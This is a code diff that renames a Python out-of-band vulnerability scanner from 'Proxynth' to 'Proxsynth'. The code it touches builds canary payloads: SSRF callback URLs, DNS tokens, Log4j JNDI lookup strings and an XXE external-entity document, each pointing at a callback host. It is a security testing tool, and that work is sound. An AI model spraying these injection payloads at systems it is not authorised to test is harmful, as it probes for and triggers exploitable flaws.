@@ -1,5 +1,5 @@
 """
-Proxynth - Autonomous Out-of-Band (OAST) Canary Sprayer
+Proxsynth - Autonomous Out-of-Band (OAST) Canary Sprayer
 Automatically discovers target parameters (query, form body, headers) and sprays
 multi-protocol canary tokens (HTTP, DNS, LDAP/JNDI, XXE) across endpoints.
 Correlates incoming out-of-band interactions to deterministically detect
@@ -39,11 +39,11 @@ def _build_canary_payloads(token: str, vuln_type: str, callback_url: str) -> Lis
 
     if vuln_clean in ["ssrf", "http", "all"]:
         payloads.append(f"{callback_url.rstrip('/')}/oast/{token}")
-        payloads.append(f"http://{token}.oast.proxynth.local/callback")
+        payloads.append(f"http://{token}.oast.proxsynth.local/callback")
 
     if vuln_clean in ["dns", "all"]:
-        payloads.append(f"{token}.oast.proxynth.local")
-        payloads.append(f"http://{token}.oast.proxynth.local")
+        payloads.append(f"{token}.oast.proxsynth.local")
+        payloads.append(f"http://{token}.oast.proxsynth.local")
 
     if vuln_clean in ["jndi", "log4j", "all"]:
         # LDAP port 1390 and DNS port 5354 listeners
@@ -51,7 +51,7 @@ def _build_canary_payloads(token: str, vuln_type: str, callback_url: str) -> Lis
         payloads.append(f"${{jndi:dns://{cb_host}:5354/{token}}}")
 
     if vuln_clean in ["xxe", "all"]:
-        payloads.append(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{token}.oast.proxynth.local/xxe"> %xxe;]><root>test</root>')
+        payloads.append(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{token}.oast.proxsynth.local/xxe"> %xxe;]><root>test</root>')
 
     return payloads or [f"{callback_url.rstrip('/')}/oast/{token}"]
 
